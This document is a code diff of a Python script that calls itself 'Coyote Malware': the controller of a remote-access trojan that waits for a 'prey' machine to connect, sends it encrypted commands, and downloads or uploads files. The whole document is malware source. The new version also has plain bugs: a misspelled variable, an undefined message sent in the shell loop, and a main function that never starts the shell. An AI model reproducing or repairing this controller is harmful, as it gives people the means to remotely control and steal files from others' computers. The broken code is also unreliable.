@@ -1,85 +1,72 @@
 #-*-coding: utf-8-*-
-from socket import *
-from threading import Thread
-from optparse import OptionParser as op
-from platform import python_version as pv
-from sys import argv
+from socket import socket, AF_INET, SOCK_STREAM
 from cryptography.fernet import Fernet as fern
+from optparse import OptionParser as op
+from time import sleep
+from sys import argv
+
 class Coyote:
-	def __init__(self, ip, port, key):
-		self.f = fern(key)
-		self.sock = socket(AF_INET, SOCK_STREAM)
-		self.sock.bind((ip, port))
-		self.sock.listen(1)
-		self.sock.settimeout(0.0)
-		self.downloadfile = ""
-		self.features = {"totallyhear" : True,"hear":True, "waitPrey": True, "printaddr":True}
-	def connectPrey(self):
-		while self.features["waitPrey"]:
-			try:
-				self.conn, addr = self.sock.accept()
-				if self.features["printaddr"]:
-					print(addr)
-			except:
-				pass
-			else:
-				break
+    def __init__(self, port, key, defaulthearing=True, printing=True):
+        if(printing):
+            print("Starting Coyote Malware...");
+        self.conn = 0;
+        self.f = fern(key);
+        self.sock = socket(AF_INET, SOCK_STREAM);
+        self.sock.bind(('0.0.0.0', port));
+        self.sock.listen(1);
+        if(defaulthearing):
+            if(printing):
+                print("Waiting for prey");
+            self.conn, addr = self.sock.accept();
+            if(printting):
+                print("They prey has connected");
+    def shell(self):
+        cmd = "";
+        while(cmd != "exit"):
+            cmd = input(">>>");
+            self.send(msj);
+            if(cmd[:3] == "get"):
+                self.getFile(cmd[4:]);
+            elif(cmd[:4] == "send"):
+                self.sendFile(cmd[5:]);
+            else:
+                self.recv();
+        self.conn.close();
 
-	def hearPrey(self):
-		while self.features["totallyhear"]:
-			while self.features["hear"]:
-				try:
-					msj = self.conn.recv(3072)
-					msj = self.decode(msj)
-					if msj == "Sending file.":
-						self.downloadf(self)
-					else:
-						print(msj)
-				except:
-					pass
-	def downloadf(self):
-		content = self.conn.recv(3072)
-		content = self.f.decrypt(content)
-		with open(self.downloadfile, "wb") as f:
-			f.write(content)
+    def send(self, msj):
+        if(type(msj) != type(b"byte")):
+            msj = str(msj).encode();
+        msj = self.f.encrypt(msj);
+        self.conn.send(msj);
+    def getFile(self, file):
+        self.send("-*-");
+        sleep(3);
+        self.send(file);
+        if(self.recv()):
+            self.send(file);
+        with open(file, "wb") as f:
+            content = self.f.decrypt(self.conn.recv(1024));
+            f.write(content);
+        print("Done!");
+    def sendFile(self, file):
+        try:
+            with open(file,"rb") as f:
+                content = f.read(1024);
+        except FileNotFoundError:
+            print("File not found.");
+        else:
+            self.send("*-*");
+            sleep(3);
+            self.send(file);
+            sleep(3);
+            self.send(content);
 
-	def shell(self):
-		if pv()[0] == "3":
-			raw_input = input
-		cmd = ""
-		while cmd != "exit":
-			cmd = raw_input(">>>")
-			if cmd[:7] == "getfile":
-				self.downloadfile = cmd[8:]
-			elif cmd[:7] == "turnoff":
-				self.features[cmd[8:]] = False
-				continue
-			elif cmd[:6] == "turnon":
-				self.features[cmd[9:]] = True
-				continue
-			self.send(cmd)
-	def send(self, msj):
-		if not type(msj) == type(b""):
-			msj = msj.encode()
-		msj = self.f.encrypt(msj)
-		self.conn.send(msj)
-	def decode(self, msj):
-		msj = self.f.decrypt(msj)
-		msj = msj.decode()
-		return msj
 
 
 def main():
-	o = op("Usage: %prog [args] [values]")
-	o.add_option("-H", "--host",dest="ip",default="127.0.0.1",help="Set your host.")
-	o.add_option("-p", "--port",dest="port",default=5000,help="Set port.", type="int")
-	o.add_option("-k", "--key", dest="key",default="FUYG1sNMAm-QVFJ02RMh6Bpms7bxZSMLmqjmnJXsO3w=",help="Set Fernet key")
-	(opt, argv) = o.parse_args()
-	c = Coyote(opt.ip,opt.port,opt.key)
-	c.connectPrey()
-	hear = Thread(target=c.hearPrey)
-	hear.daemon = True
-	hear.start()
-	c.shell()
+    c = Coyote(5000, b"dgjVmVHUY_0GlJ2t8aHX5YfacfGkQcLlcIREQ9nPd7U=");
+
+
 if __name__ == '__main__':
-	main()
+    main()
+
